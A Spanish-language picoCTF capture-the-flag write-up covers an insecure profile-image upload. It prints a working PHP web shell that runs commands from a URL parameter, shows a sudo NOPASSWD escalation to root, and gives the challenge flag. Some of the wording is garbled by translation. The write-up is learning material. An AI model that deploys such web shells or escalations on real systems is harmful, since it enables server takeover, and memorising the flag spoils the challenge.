#### Descripción

Un desarrollador ha agregado la funcionalidad de carga de imágenes de perfil a un sitio web. Sin embargo, la implementación es defectuosa y presenta una oportunidad para usted. Tu misión, si decides aceptarla, es navegar hasta el lugar provisto. página web y localice el área de carga de archivos. Su objetivo final es encontrar el hidden ubicado en el directorio.`/root`

Habrá detalles adicionales disponibles después de lanzar la instancia de desafío.

### Solución
- En primer lugar, vaya a la instancia y verá que existe la vulnerabilidad de carga de archivos
- Por lo tanto, se puede cargar cualquier tipo de script

1. Vulnerabilidad de carga de archivos

- Luego hice este shell php y lo subí al servidor:

<?php  
if(isset($_GET['cmd'])){  
    echo "<pre>";  
    $cmd = $_GET['cmd'];  // Get command from the query string  
    system($cmd);         // Execute the command and display output  
    echo "</pre>";  
}  
?>

2. php Shell subido

- Luego, cualquier comando se puede ejecutar activando la ruta:  
    Punto final: **uploads/shell.php?cmd=**

http://standard-pizzas.picoctf.net:63914/uploads/shell.php?cmd=

- Vamos a comprobar el usuario actual:

http://standard-pizzas.picoctf.net:63914/uploads/shell.php?cmd=whoami

3. Usuario actual

- Ahora veamos los privilegios para el usuario actual:

3. Sin contraseña de root

Matching Defaults entries for www-data on challenge:  
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin  
  
User www-data may run the following commands on challenge:  
    (ALL) NOPASSWD: ALL

(ALL) NOPASSWD: ALL

- Por lo tanto, no se necesitará ninguna contraseña para acceder a ningún usuario, así como a la root.
- Ahora vamos a obtener la bandera como usuario root:

### Bandera
`picoCTF{wh47_c4n_u_d0_wPHP_b42a374d}`
